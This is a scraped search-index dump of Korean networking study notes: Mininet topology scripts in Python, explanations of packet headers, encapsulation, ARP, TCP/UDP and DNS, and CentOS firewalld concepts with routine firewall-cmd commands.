run(self):\rnet = Mininet(self)\rnet.start()\rdumpNodeConnections(net.hosts)\rdumpNodeConnections(net.switches)\rnet.pingAll()\rCLI(net)\rnet.stop()\tif __name__ == \u0026#39;__main__\u0026#39;:\tsetLogLevel(\u0026#39;info\u0026#39;)\rsingle = SingleTopo(k=3)\rsingle.run()\r\r\r\r\r   \rn Code\r...\r\r#-*- coding: utf-8 -*-\r #!/usr/bin/python\r from mininet.topo import Topo\rfrom mininet.net import Mininet\rfrom mininet.util import irange,dumpNodeConnections\rfrom mininet.log import setLogLevel\rfrom mininet.cli import CLI\rclass SingleTopo(Topo):\rdef __init__(self, k=1, **opts):\rsuper(SingleTopo, self).__init__(**opts)\rswitch = self.addSwitch(\u0026#39;s1\u0026#39;)\rfor i in range(1,k+1):\rhost = self.addHost(\u0026#39;h%s\u0026#39; % i)\rself.addLink(host, switch)\rdef run(self):\rnet = Mininet(self)\rnet.start()\rdumpNodeConnections(net.hosts)\rdumpNodeConnections(net.switches)\rnet.pingAll()\rCLI(net)\rnet.stop()\tif __name__ == \u0026#39;__main__\u0026#39;:\tsetLogLevel(\u0026#39;info\u0026#39;)\rsingle = SingleTopo(k=3)\rsingle.run()\r\r\r\r\r  python singleDemo.py로 실행 토폴로지가 구성되고 실행된 후 핑 테스트 후 종료    mn 명령어로 파이썬 토폴로지 실행하기   \rmn Code\r...\r\r#-*- coding: utf-8 -*-\r #!/usr/bin/python\r from mininet.topo import Topo\rfrom mininet.net import Mininet\rfrom mininet.util import irange,dumpNodeConnections\rfrom mininet.log import setLogLevel\rclass SingleTopo(Topo):\rdef __init__(self, k=1, **opts):\rsuper(SingleTopo, self).__init__(**opts)\rswitch = self.addSwitch(\u0026#39;s1\u0026#39;)\rfor i in range(1,k+1):\rhost = self.addHost(\u0026#39;h%s\u0026#39; % i)\rself.addLink(host, switch)\rdef run(self):\rnet = Mininet(self)\rnet.start()\rtopos = {\u0026#39;mytopo\u0026#39;:( lambda x: SingleTopo(k=x))}\r코드 수정 후\n명령어 실행 sudo mn \u0026ndash;custom /sjb/singleDemo.py \u0026ndash;topo mytopo,3\n\r\r\r  Linear 토폴로지 구성  \rLinear Code\r...\r\r#!/usr/bin/python\r from mininet.topo import Topo\rfrom mininet.net import Mininet\rfrom mininet.util import irange,dumpNodeConnections\rfrom mininet.log import setLogLevel\rfrom mininet.cli import CLI\rclass LinearTopo(Topo):\rdef __init__(self, k=1, **opts):\rsuper(LinearTopo, self).__init__(**opts)\rlastSwitch = None\rfor i in range(1,k+1):\rhost = self.addHost(\u0026#39;h%s\u0026#39; % i)\rswitch = self.addSwitch(\u0026#39;s%s\u0026#39; % i)\rself.addLink(host, switch)\rif lastSwitch:\rself.addLink(switch, lastSwitch)\rlastSwitch = switch\rdef run(self):\rnet = Mininet(self)\rnet.start()\rdumpNodeConnections(net.hosts)\rdumpNodeConnections(net.switches)\rnet.pingAll()\rCLI(net)\rnet.stop()\tif __name__ == \u0026#39;__main__\u0026#39;:\tsetLogLevel(\u0026#39;info\u0026#39;)\rsingle = LinearTopo(k=3)\rsingle.run()\r\r\r\r\r Tree 토폴로지 구성  \rTree Code\r...\r\r#!/usr/bin/python\r from mininet.topo import Topo\rfrom mininet.net import Mininet\rfrom mininet.util import irange,dumpNodeConnections\rfrom mininet.log import setLogLevel\rfrom mininet.cli import CLI\rclass TreeTopo(Topo):\rdef __init__(self, **opts):\rsuper(TreeTopo, self).__init__(**opts)\rswitch1 = self.addSwitch(\u0026#39;s1\u0026#39;)\rswitch2 = self.addSwitch(\u0026#39;s2\u0026#39;)\rswitch3 = self.addSwitch(\u0026#39;s3\u0026#39;)\rhost1 = self.addHost(\u0026#39;h1\u0026#39;)\rhost2 = self.addHost(\u0026#39;h2\u0026#39;)\rhost3 = self.addHost(\u0026#39;h3\u0026#39;)\rhost4 = self.addHost(\u0026#39;h4\u0026#39;)\rself.addLink(switch1, switch2)\rself.addLink(switch1, switch3)\rself.addLink(host1, switch2)\rself.addLink(host2, switch2)\rself.addLink(host3, switch3)\rself.addLink(host4, switch3)\rdef run(self):\rnet = Mininet(self)\rnet.start()\rdumpNodeConnections(net.hosts)\rdumpNodeConnections(net.switches)\rnet.pingAll()\rCLI(net)\rnet.stop()\tif __name__ == \u0026#39;__main__\u0026#39;:\tsetLogLevel(\u0026#39;info\u0026#39;)\rsingle = TreeTopo()\rsingle.run()\r\r\r\r\r   \rTree Code\r...\r\r#!/usr/bin/python\r from mininet.topo import Topo\rfrom mininet.net import Mininet\rfrom mininet.util import irange,dumpNodeConnections\rfrom mininet.log import setLogLevel\rclass TreeTopo(Topo):\rdef __init__(self, depth=2, **opts):\rsuper(TreeTopo, self).__init__(**opts)\rhost=1\rfor i in range(1, 2**depth):\rself.addSwitch(\u0026#39;s%s\u0026#39; % i)\rfor i in range(1, 2**depth+1):\rself.addHost(\u0026#39;h%s\u0026#39; % i)\rfor i in range(1, 2**depth):\rif i\u0026gt;=2**(depth-1) :\rp = \u0026#34;s%s\u0026#34; % i\rc1 = \u0026#34;h%s\u0026#34; % host\rhost+=1\rc2 = \u0026#34;h%s\u0026#34; % host\rhost+=1\rself.addLink(p, c1)\rself.addLink(p, c2)\relse :\rp = \u0026#34;s%s\u0026#34; % i\rc1 = \u0026#34;s%s\u0026#34; % (i*2)\rc2 = \u0026#34;s%s\u0026#34; % (i*2+1)\rself.addLink(p, c1)\rself.addLink(p, c2)\rdef run(self):\rnet = Mininet(self)\rnet.start()\rdumpNodeConnections(net.hosts)\rdumpNodeConnections(net.switches)\rnet.pingAll()\rnet.stop()\tif __name__ == \u0026#39;__main__\u0026#39;:\tsetLogLevel(\u0026#39;info\u0026#39;)\rsingle = TreeTopo(depth=2)\rsingle.run()\rmn \u0026ndash;custom [ py 파일의 경로 ] \u0026ndash;topo mytopo\n  OpenDayLight   GUI 환경    # Initialize topology\rTopo.__init__( self )\r# Add hosts and switches\rh1 = self.addHost( 'h1' )\rh2 = self.addHost( 'h2' )\rh3 = self.addHost( 'h3' )\rh4 = self.addHost( 'h4' )\rs1 = self.addSwitch( 's1' )\rs2 = self.addSwitch( 's2' )\rs3 = self.addSwitch( 's3' )\rs4 = self.addSwitch( 's4' )\r# Add links\rself.addLink( h1, s1 )\rself.addLink( h2, s2 )\rself.addLink( h3, s3 )\rself.addLink( h4, s4 )\rself.addLink( s1, s2 )\rself.addLink( s1, s3 )\rself.addLink( s1, s4 )\rself.addLink( s2, s3 )\rself.addLink( s2, s4 )\rself.addLink( s3, s4 )  \u0026lt;/div\u0026gt;\r \r\r\r "});index.add({'id':147,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/%E3%84%B4-packet/','title':"ㄴ Packet",'content':"네트워크 패킷 ( Network Packet )    패킷이란 데이터의 묶음 단위로 한번에 전송할 데이터의 크기\n  제 3계층 이상 ( Network 계층 ) 에서는 이 데이터의 묶음을 패킷이라고 부르며, 제 2계층에서는 프레임( Frame )\n  패킷의 크기는 네트워크의 종류에 따라 크기가 다름\n  패킷을 이렇게 나눠 보내는 이유는 컴퓨터는 동시다발적으로 데이터를 전송하는 데, 한 데이터에게만 데이터를 줄 경우, 한 컴퓨터와의 통신밖에 하지 못하기에, 데이터를 나눠 모두에게 통신할 수 있게 하며, 중간에 에러가 날 경우를 대비\n     패킷의 기본 구조      크게 패킷은 헤더 ( header ) 와 페이로드 ( Payload ) 두 부분으로 나누어 진다.\n Hader: 출발 주소, 도착 주소, 패킷 길이 등 ( 헤더에 종류에 따라 내용이 달라질 수 있음 ) Payload: 전송되는 실제 콘텐츠나 데이터 ( 이메일, 메시지, 인터넷 전화, 웹서핑 세션 등)    즉 위의 그림과 같이 데이터는 계층의 헤더 ( Hader ) + 페이로드 ( Payload )로 이루어져 있으며, 헤더가 붙은 계층에 따라 비트, 프레임, 패킷, 세그먼트, 데이터 라 한다.\n     각 네트워크 계층의 단위 \rNetwork Layer \r...\r\r 데이터 (Data): 상위 계층 ( OSI 7-5 Layer Sesstion, Presentation, Application )\n 세그먼트 ( Segment ): ( OSI 4 Layer Transport )\n 패킷 ( Packet ): ( OSI 3 Layer Network )\n 프레임 ( Frame ): ( OSI 2 Layer DataLink )\n 비트 ( Bit ): ( OSI 1 Layer Physical )\n     \r\r\r  헤더는 우편 봉투에 적혀있는 주소와 유사한 열할을 하며, 페이로드는 편지봉투 안의 편지 내용을 뜻한다 할 수 있다\n  데이터는 데이터 상태로 상대방에게 바로 전달해주지 못한다. 그렇기에 상대방이 데이터를 볼 수 있게 송신과정을 거쳐야 하는 데 이를 인 캡슐레이션 이라 하며, 수신자는 반대로 수신과정을 거치는 데 이를 디 캡슐레이션 이라 한다.\n   네트워크 인 캡슐레이션 ( Network Encapsulation )  \rNetwork Encapsulation \r...\r\r   위에 언급한 듯이 송신자가 수신자에게 데이터를 볼 수 있도록 포장하는 것을 인캡슐레이션이라 하며 이는 OSI L7에서 L1 방향으로 진행 된다.\n  Payload를 4 계층 TCP 헤더로 캡슐화( 세그먼트 ) -\u0026gt; IPv4, TCP 헤더로 캡슐화 ( 패킷 ) -\u0026gt; IPv4, TCP, Ethernet( 프레임 )으로 캡슐화 하는 것을 인 캡슐레이션이라 한다.\n  \r\r\r 네트워크 디 캡슐레이션 ( Network Depsulation )  \rNetwork Decapsulation \r...\r\r  인캡슐레이션 되어진 ( 포장되어진 ) 페이로드를 읽기위해서 포장되어진 역 순서로 다시 헤더를 제거하는 것을 디 캡슐레이션이라 하며, OSI L1에서 L7 방향으로 진행 된다.\n  Payload를 IPv4, TCP, Ethernet ( 프레임 ) -\u0026gt; IPv4, TCP, ( 패킷 ) -\u0026gt; TCP ( 세그먼트 ) -\u0026gt; 데이터로 캡슐화를 해제하는 것을 디 캡슐레이션이라 한다.\n  \r\r\r   각 계층의 Protocol   각 프로토콜은 2진수 1개 = 1bit 2진수 8개 = 8bit 2진수 4개 = 16진수 1개 16진수 2개 = 2진수 8개 16진수 2개 8bit = 1byte를 뜻함   2계층 ( Data-Link )    2계층은 하나의 네트워크 대역 즉, 네트워크 상에 존재하는 여러 장비들 중에서 어떤 장비에게 보내는 데이터를 전달하는 역할 을 수행.\n  추가적으로 오류제어, 흐름제어 수행.\n  하나의 네트워크 대역 LAN에서만 통신할 때 사용하며,다른 네트워크와 통신 할 때에는 3계층이 도와주어야만 통 신이 가능\n    Ethernet 14byte Destination Address: 데이터를 전달받은 상대방의 시스템 MAC 주소 6byte Source Address: 데이터를 전달하는 시스템의 MAV 주소 6byte 상위 프로토콜 타입: 2byte, IPv4 ( 0x0800 ), ARD ( 0x0806 )     3계층 ( Network )  ARP Protocol    ARP 프로토콜은 같은 네트워크 대역에서 통신을 하기 위해 필요한 MAC주소를 IP주소를 이용해서 알아오는 프로토콜\n  같은 네트워크 대역에서 통신을 한다고 하여도 데이터를 보내기 위해서는 7계층부터 캡슐화를 통해 데이터를 보내기 때문에 IP주소와 MAC주소가 모두 필요하며, 이 때 IP주소는 알고 있어도 MAC 주소는 모르더라도 ARP를 통해 통신이 가능\n  ARP는 같은 대역에서만 사용가능\n     Hardware type, Protocol type, Hardware Address Length, Protocol affress Length는 모두 고유의 값을 가짐\n  Opcode: 세팅이 1이면 요청, 2면 답하는 것으로 세팅 됨\n  최소는 60byte, 최대는 1514byte\n   \rARP Process\r...\r\r  목적지 주소를 알지 못해, 목적지 주소 ( MAC )자리에는 0으로 비워둠\n  인캡슐레이션 후, 주소를 알지 못해 브로드캐스트 방식으로 모두에게 요청을 보낸 후, 아이피가 맞지 않으면 버리고, 맞는 아이피를 가지고 있는 PC는 자기의 주소를 다시 송신하고, 그러면 초기 송신자는 목적지 주소( MAC )를 알 수 있게 되어지는 원리\n   발신자\n 수신자\n\r\r\r   IPv4 Protocol    IPv4는 네트워크 상에서 데이터를 교환하기 위한 프로토콜이지만, 데이터가 정확하게 전달될 것을 보장하지는 않음\n  복된 패킷을 전달하거나 패킷의 순서를 잘못 전달할 가능성도 있음 (악의적으로 이용되면 DoS 공격이 됨 )\n  데이터의 정확하고 순차적인 전달은 그보다 상위 프로토콜인 TCP에서 보장\n    구조 설명   Version: IP 프로토콜의 버전 ( 대부분이 4, 16진수 중 하나 )\n  IHL ( Hearder Length ): 헤더의 길이 표현법 = n/4 최소 20 ~ 60\n  Type of Service ( TOS ): 데이터의 형식으로 현재는 잘 쓰이지 않으며 0으로 비워둠\n  Total Length: 모두를 합친 전체의 길이를 뜻함\n  Identification: 조각화 된 데이터의 ID를 부여하는 것\n  IP Flags X: 쓰이지 않음, D: 데이터를 송싱자가 안쪽에서 설정하는 것, M: 조각화가 진행될 경우 1로 세팅, 그렇지 않을 경우 0\n  Fragment Offset: 조각화가 발생했을 때 조각들의 시작 위치를 나타내는 값\n  offset: 어느 기준으로부터 얼마만큼 떨어져있는 지를 나타냄\n  Time to Live ( TTL ) : 패킷이 유지 될 수 있는 시간 ( 횟수 ), 네트워크 장비를 지나갈 때마다 1씩 줄어듬\n       ICMP Protocol   8 ( 요청 )/ 0 ( 정상적인 응답 ) 3 ( 목적지 도착 불가능 ) / 11 ( 시간 초과 ) 5 ( 리 다이렉트, 라우팅 테이블 수정 )    4계층 ( Transport )    4계층 전송 계층 ( Transprot layer )은 송신자의 프로세스와 수신자의 프로세스를 연결하는 서비스 를 제공하는 계층이다.\n  전송 계층은 연결 지향 데이터의 스트림 지원, 신뢰성, 흐름 제어, 그리고 다중화와 같은 편리한 서비를 제공한다.\n  전송 프로토콜 중 가장 장 알려진 것은 연결 지향전송박시으로 사용하는 전송제어 프로토콜( TCP ) 단순한 전송에 사용되는 사용자 데이터 프로토콜 ( UDP ) 가 있다\n   UDP Protocol    UDP 프로토콜 ( User Datagram Protocol )은 데이터 그램 프로토콜 ( Universal Datagram Protocol )이라고 일컫기도 한다.\n  UDP의 전송 방식은 너무 단순해서 서비스의 신뢰성이 낮고, 데이터그램의 도착 순서가 바뀌거나, 중복되거나, 심지어는 통보 없이 누락 시키기도 한다.\n  UDP는 일반적으로 오류의 검사와 수정이 필요 없는 프로그램에서 수행할 것으로 가정해야 한다.\n      TCP Protocol    전송 제어 프로토콜 (Transmission Control Protocol ) 은 인터넷에 연결된 컴퓨터에서 실행되는 프로그램 간에 통신을 안정적으로, 순서대로 에러없이 교환 할 수 있다\n  TCP의 안정성을 필요로 하지 않은 애플리케이션의 경우 일반적으로 TCP 대신 비접속형 사용자 데이터그램 프로토콜 ( User Datagream Protocol )을 사용하여, TCP는 UDP보다 안전하지만 느리다\n    TCP Fags  Window: 상대방과 데이터를 주고 받을 때, 얼마만큼의 데이터를 보낼 지 정하는 역할을 수행 ( 남아있는 TCP 공간을 알려줌 ) TCP Flags : 어떤값을 보낼지 세팅하는 값 C, E: 사용하지 않음 U: Uregent ( 긴급 bit ) - 우선순위가 포함되어있음 ( 1- 급한 데이터 ) A: Acknowledgment ( 승인 bit ) P: Push ( 밀어넣기 bit ) R: Reset ( 초기화 bit ) S: Syn ( 동기화 bit ) - 상대방과 연결을 시작할 때 반드시 사용 F: Fin ( 종료 bit )     3Way Handshake \r3Way Handshake\r...\r\r  TCP를 이용한 데이터 통신을 할 때 프로세스와 프로세스를 연결하기 위해 가장 먼저 수행되는 과정\n  클라이언트가 서버에게 요청 패킷을 보내고\n  서버가 클라이언트의 요청을 받아 패킷을 보내고\n  클라이언트는 이를 최종적으로 수락하는 패킷을 보낸다.\n      과정설명   보낸 쪽에서 보낼 때는 SEQ번호와 ACK번호가 그대로이다.\n  받는 쪽에서 SEQ번호는 받은 ACK번호가 된다.\n  받는 쪽에서 ACK번호는 받은 SEQ번호 + 데이터 크기가 된다.\n    \r\r\r   7계층 ( Application )  HTTP Protocol    DNS Protocol    기존의 192.168\u0026hellip;.. 등의 호스트 도메인의 이름을 네트워크 주소로 바꾸거나 그 반대의 변환을 수행을 위해 개발되어짐\n  일반적으로 www.xxx.com과 같은 도메인 주소를 입력하면 해당 주소에 맞는 IP주소로 변환시켜주는 역할을 수행\n  \rDNS 서버는 계층 구조로 이루어져 있음\r...\r\r DNS 서버는 계층 구조   루트 DNS 서버\n 최상위 레벨의 DNS 서버\n 책임 DNS 서버\n 로컬 DNS 서버로 구성\n    \r\r\r}\n     Domain address    인터넷 상에서의 주소인 URL의 일부\n  도메인 또는 도메인 네임( Domain name )은 넓게 보면 암기 및 식별하기 어려운 IP주소를 example.com처럼 기억하기 쉽게 만들어주는 네트워크 호스트를 의미\n  보통 루트 네임 서버( 최상위 DNS서버로 JAVA에서 관리 )에 등록된 최상위 호스트 네임을 관리하는 도메인 레지스트리에서 관리하는 하위 호스트 네임을 이르는 말\n     쿼리( Query )  재귀 쿼리\n 로컬 DNS서버와 주고받는 질의와 응답     반복 쿼리\n 로컬 DNS 서버가 다른 DNS 서버와 주고 받는 응답     권한이 없는 응답\n 반복 쿼리를 통해 알아온 주소     권한이 있는 응답\n 로컬 DNS가 알고 있는 주소     ZONE 영역파일   호스트 IP를 저장하고 있는 파일      IP( Internet Protocol )은 네트워크 계층에서 사용하는 주소로, 컴퓨터는 MAC주소를 사용하지만, 사람이 읽기 힘들어 읽기 편한 IP주소를 사용 한다.\n  3계층은 다른 네트워크 대역 즉, 멀리 떨어진 곳에 존재하는 네트워크까지 어떻게 데이터를 전달할지 제어하는 일을 담당, 발신에서 착신까지의 패킷의 경로를 제어하는 역할을 수행 하며 거리가 먼 다른 기기와 통신을 위해서는 3계층이 필요하다\n   "});index.add({'id':148,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/%E3%84%B4-portnumber/','title':"ㄴ Portnumber",'content':"TCP/ UDP 포트 번호 정리  기본적인 포트번호    Well-known port : 0 ~ 1023\n  Registered port : 1024 ~ 49151\n  Dynamic port : 49152 ~ 65535\n    \rPort Tables\r...\r\r  Register Port \r\r\r "});index.add({'id':149,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/%E3%84%B4%EB%B0%A9%ED%99%94%EB%B2%BD/','title':"ㄴ방화벽",'content':"방화벽 (CentOS - firewalld)    리눅스의 방화벽\n 커널의 Netfilter 모듈에 기초를 두고 있는 하나의 프로그램 방화벽은 일반적으로 내부와 외부 네트워크의 경계 지점에 위치 기본적으로 들어오고 나가는 패킷에 대해 지정된 정책과 규칙을 사용 허용(Accept)과 거절(Reject)이라는 행동을 통해 모든 패킷을 통제       방화벽의 종류\n 패킷 필터링 방화벽  - 제 1세대 방화벽 - 레이어 1~4에서 사용 - 단순하기 때문에 빠르고 효과적 - 5~7계층 대응 불가  Stateful 방화벽  - 제 2세대 방화벽 - 패킷의 연결 상태를 관찰 - 메모리에서 상태 테이블 사용 - DoS 공격과 같은 메모리 잠식 공격에 취약  **애플리케이션 레이어 방화벽 **  - 제 3세대 방화벽 - 레이어7까지 패킷 검사와 필터링 - 고사양의 장비가 필요      방화벽의 구성요소   규칙(Rule) : Netfilter에서 가장 핵심적인 구성 요소로서 하나 또는 그 이상 일치돼야 할 항목들로 구성되며, 패킷이 이러한 규칙이 일치(match)할 경우 타겟을 이용해 구체적인 행동 사항을 지정한다. 들어오는 패킷이 설정된 여러 규칙 중 한가지와 일치할 경우 더 이상의 규칙 검사는 진행되지 않으며 이 규칙에 정의된 target, 즉 구체적인 행동이 적용되면서 이 패킷에 대한 동작을 종료하게 된다.\n  타겟(Target) : 정해진 규칙에 일치된 패킷은 해당 규칙에 지정된 타켓으로 보내진다. 이 타겟은 이렇게 일치된 패킷에 대해 구체적인 행동을 정의한 것인데, 각각 내장 타겟과 확장 타겟을 통해 다양한 종류의 타겟을 사용할 수 있다. 대표적으로 사용되는 내장 타겟으로 패킷을 받아들이는 Accept, 패킷을 거부하는 Drop과 Reject, 패킷에 대한 자세한 정보를 기록하는 Log, 마지막으로 주소 변환에 사용되는 SNAT와 DNAT 등이 있다.\n  체인 (Chain) : Netfilter 구조에서 체인은 정책이 결합된 하나의 그룹이다. 일반적으로 한 개의 체인은 여러 개의 규칙과 한 개의 정책으로 구성된다. 체인으로 들어온 패킷은 각각의 규칙을 순서대로 거치게 되며, 이 중 한 규칙과 일치되면 이 패킷은 그 규칙에 정의된 타겟으로 보내진다. 이로써 그패킷에 대한 체인에서의 모든 과정은 종료된다. 최종적으로 일치되는 규칙이 없는 경우 이 체인에 설정된 정책이 적용된다. 체인과 체인 간에 복잡한 설정이 필요한 경우 Netfilter가 지원하는 매우 뛰어난 기능이며, 가장 대표적인 체인으로 PREROUTING, INPUT, OUTPUT, FORWARD, POSTROUTING이 사용된다.\n  정책(Policy) : Netfilter가 제공하는 모든 체인을 갖고 있는데, 이 정책은 체인에서 각 규칙을 모두 통과한 패킷에 적용된다. 이 정책은 수행하는 마지막 행위로서 최종 타겟이라고도 하는데, 정책의 종류로 DROP, ACCEPT 등이 사용된다.\n  테이블(Table) : 체인은 여러 개의 규칙과 한 개의 정책이 결합된 그룹이라고 설명했는데, 테이블은 여러 체인이 결합된 그룹이다.\n       Firewalld Zone\n  Drop 존\n 들어오는 모든 패킷은 버려지고 이에 대한 응답 메시지도 보내지 않으며 단지 외부로로 나가는 연결만 허용    Block 존\n Drop 존처럼 들어오는 모든 네트워크 연결은 거부되는데, 이에 대해 icmp-host-prohibited와 icmp6-prohibited라는 응답 메시지를 보낸다.    Public 존\n 서비스를 제공하는 특별한 포트로의 연결만을 허용하고, 그 외 포트로의 연결은 모두 거부되며 기본 Zone으로 사용    External 존\n 특별히 매스커레이딩 규칙이 적용되는 외부의 라우터를 위해 사용되며, 단지 내부로의 연결 요청 중에서 선택된 연결만을 허용    DMZ 존\n 내부 네트워크로의 접근은 제한적으로 허용되지만, 공개된 네트워크에 대한 접근을 허용하는 경우에 사용되며 이 경우도 선택된 연결만이 허용    Work 존\n 같은 회사에 위치한 네트워크를 위해 사용되며, 대부분 같은 네트워크에 위치한 다른 시스템을 신뢰하고 오직 선택된 연결만을 접속 허용    Home 존\n 홈 영역을 위해 사용되며, 네트워크에 존재하는 다른 시스템을 신뢰하고 오직 선택된 연결만을 접속 허용    Internal 존\n 내부 네트워크를 위해 사용되고, 선택된 연결만을 접속 허용    Trusted 존\n 모든 네트워크 접속 연결을 허용하는 경우 사용         NAT ( Natwork Address Translation )\n  Network Address Translation, IP 패킷 헤더의 IP주소를 변경하는 기능 혹은 그러한 절차.\n  PREROUTING : DNAT를 이용하여 패킷이 생길 때 사용\n  POSTROUTING : SNAT를 이용하여 패킷이 생길 때 사용\n  iptables -L\n   SNAT  Source의 IP주소를 변경하는 것, 내부 -\u0026gt; 외부   DNAT  Destination의 IP주소를 변경하는 것, 외부 -\u0026gt; 내부         명령어  firewall-cmd --[옵션]=[Firewalld Zone] --[add, remove 등의 명령어]-[interface]=[ens33] [ --permanent 영구히 사용]  버전확인 firewall-cmd --version  방화벽 실행여부 확인 firewall-cmd --state  방화벽 리로드 firewall-cmd  Zone 목록을 출력 firewall-cmd --get-zones  Zone 기본 존을 출력 firewall-cmd --get-default-zone  ** 활성화된 Zone을 출력** firewall-cmd --get-active-zones  사용 가능한 서비스/ 포트 목록을 출력 firewall-cmd --lost-all  public 존에 속한 사용 가능한 모든 서비스/ 포트 목록을 출력 firewall-cmd --zone=public --list-all  ftp 서비스 추가 firewall-cmd --add-service=ftp  ftp 서비스를 제거 firewall-cmd --remove-service=ftp  21 tcp 포트를 추가 firewall-cmd --add-port=21/tcp  21 tcp 포트를 제거 firewall-cmd --remove-port=21/tcp  trusted 존에 ftp 서비스를 추가 firewall-cmd --zone=trusted --add-service=ftp  시스템 재부팅 또는 방화벽 재시작 후에도 적용되도록 하려면 \u0026ndash;permanent 옵션 firewall-cmd --permanent --add-service=ftp  포트포워딩 설정 firewall-cmd --add-forward-port=port=1000:proto=tcp:toport=80:toaddr=10.10.10.10  커맨드 확인 firewalld-cmd --get-service  방화벽 사용 중 확인 firewall-cmd --list-service cat /etc/firewalld/zones/public.xml  Zone 영역확인 firewall-cmd --get-zones # 존 영역 확인 firewall-cmd --get-active-zones firewall-cmd --get-active-zones firewall-cmd --get-active-zones firewall-cmd --list-all-zones # 모든 존 영역 확인  방화벽 재시작 firewall-cmd --reload  포트추가 firewall-cmd --zone=public --add-port=9090/tcp  firewall-cmd \u0026ndash;zone=public \u0026ndash;add-icmp-block=redirect\n  룰 확인 firewall-cmd --direct --get-all-rules  룰 추가 firewall-cmd --direct --add-rule ipv4 filter INPUT 0 -p tcp --dport 9090 -j ACCEPT  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  firewall-cmd \u0026ndash;reload firewall-cmd \u0026ndash;permanent \u0026ndash;zone=external firewall-cmd \u0026ndash;add-forward-port-port=9090:proto=tcp:toport=9090:toaddr=10.10.10.20 firewall-cmd \u0026ndash;set-default-zone=external firewall-cmd \u0026ndash;zone=internal \u0026ndash;add-masquerade\n firewall-cmd \u0026ndash;r\nSTART\nOK\nENG\nASIA\nSEOUL\nDEFALUT\nINTERFACE ( 순서 )\niP설정\nSTART\nYES\nYES\n윈도우가서 로그인\n초기설정\n웹방화벽기능 이메이방어기능\n네트워크 설정\n인터페이스 앤 라우팅 -\u0026gt; 설정\n기본이 거부 출발지\n목적지\n기타 등등\n드러그앤 드랍\n네트워크 인터페이스\n뉴 인터페이스\nnew DNG 서버에 맞게 아이피 설정 규칙에 맞게 설정\n"});index.add({'id':150,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/%EB%B0%A9%ED%99%94%EB%B2%BD/','title':"방화벽",'content':"방화벽 (CentOS - firewalld)    리눅스의 방화벽\n 커널의 Netfilter 모듈에 기초를 두고 있는 하나의 프로그램 방화벽은 일반적으로 내부와 외부 네트워크의 경계 지점에 위치 기본적으로 들어오고 나가는 패킷에 대해 지정된 정책과 규칙을 사용 허용(Accept)과 거절(Reject)이라는 행동을 통해 모든 패킷을 통제       방화벽의 종류\n 패킷 필터링 방화벽  - 제 1세대 방화벽 - 레이어 1~4에서 사용 - 단순하기 때문에 빠르고 효과적 - 5~7계층 대응 불가  Stateful 방화벽  - 제 2세대 방화벽 - 패킷의 연결 상태를 관찰 - 메모리에서 상태 테이블 사용 - DoS 공격과 같은 메모리 잠식 공격에 취약  **애플리케이션 레이어 방화벽 **  - 제 3세대 방화벽 - 레이어7까지 패킷 검사와 필터링 - 고사양의 장비가 필요      방화벽의 구성요소   규칙(Rule) : Netfilter에서 가장 핵심적인 구성 요소로서 하나 또는 그 이상 일치돼야 할 항목들로 구성되며, 패킷이 이러한 규칙이 일치(match)할 경우 타겟을 이용해 구체적인 행동 사항을 지정한다. 들어오는 패킷이 설정된 여러 규칙 중 한가지와 일치할 경우 더 이상의 규칙 검사는 진행되지 않으며 이 규칙에 정의된 target, 즉 구체적인 행동이 적용되면서 이 패킷에 대한 동작을 종료하게 된다.\n  타겟(Target) : 정해진 규칙에 일치된 패킷은 해당 규칙에 지정된 타켓으로 보내진다. 이 타겟은 이렇게 일치된 패킷에 대해 구체적인 행동을 정의한 것인데, 각각 내장 타겟과 확장 타겟을 통해 다양한 종류의 타겟을 사용할 수 있다. 대표적으로 사용되는 내장 타겟으로 패킷을 받아들이는 Accept, 패킷을 거부하는 Drop과 Reject, 패킷에 대한 자세한 정보를 기록하는 Log, 마지막으로 주소 변환에 사용되는 SNAT와 DNAT 등이 있다.\n  체인 (Chain) : Netfilter 구조에서 체인은 정책이 결합된 하나의 그룹이다. 일반적으로 한 개의 체인은 여러 개의 규칙과 한 개의 정책으로 구성된다. 체인으로 들어온 패킷은 각각의 규칙을 순서대로 거치게 되며, 이 중 한 규칙과 일치되면 이 패킷은 그 규칙에 정의된 타겟으로 보내진다. 이로써 그패킷에 대한 체인에서의 모든 과정은 종료된다. 최종적으로 일치되는 규칙이 없는 경우 이 체인에 설정된 정책이 적용된다. 체인과 체인 간에 복잡한 설정이 필요한 경우 Netfilter가 지원하는 매우 뛰어난 기능이며, 가장 대표적인 체인으로 PREROUTING, INPUT, OUTPUT, FORWARD, POSTROUTING이 사용된다.\n  정책(Policy) : Netfilter가 제공하는 모든 체인을 갖고 있는데, 이 정책은 체인에서 각 규칙을 모두 통과한 패킷에 적용된다. 이 정책은 수행하는 마지막 행위로서 최종 타겟이라고도 하는데, 정책의 종류로 DROP, ACCEPT 등이 사용된다.\n  테이블(Table) : 체인은 여러 개의 규칙과 한 개의 정책이 결합된 그룹이라고 설명했는데, 테이블은 여러 체인이 결합된 그룹이다.\n       Firewalld Zone\n  Drop 존\n 들어오는 모든 패킷은 버려지고 이에 대한 응답 메시지도 보내지 않으며 단지 외부로로 나가는 연결만 허용    Block 존\n Drop 존처럼 들어오는 모든 네트워크 연결은 거부되는데, 이에 대해 icmp-host-prohibited와 icmp6-prohibited라는 응답 메시지를 보낸다.    Public 존\n 서비스를 제공하는 특별한 포트로의 연결만을 허용하고, 그 외 포트로의 연결은 모두 거부되며 기본 Zone으로 사용    External 존\n 특별히 매스커레이딩 규칙이 적용되는 외부의 라우터를 위해 사용되며, 단지 내부로의 연결 요청 중에서 선택된 연결만을 허용    DMZ 존\n 내부 네트워크로의 접근은 제한적으로 허용되지만, 공개된 네트워크에 대한 접근을 허용하는 경우에 사용되며 이 경우도 선택된 연결만이 허용    Work 존\n 같은 회사에 위치한 네트워크를 위해 사용되며, 대부분 같은 네트워크에 위치한 다른 시스템을 신뢰하고 오직 선택된 연결만을 접속 허용    Home 존\n 홈 영역을 위해 사용되며, 네트워크에 존재하는 다른 시스템을 신뢰하고 오직 선택된 연결만을 접속 허용    Internal 존\n 내부 네트워크를 위해 사용되고, 선택된 연결만을 접속 허용    Trusted 존\n 모든 네트워크 접속 연결을 허용하는 경우 사용         NAT ( Natwork Address Translation )\n  Network Address Translation, IP 패킷 헤더의 IP주소를 변경하는 기능 혹은 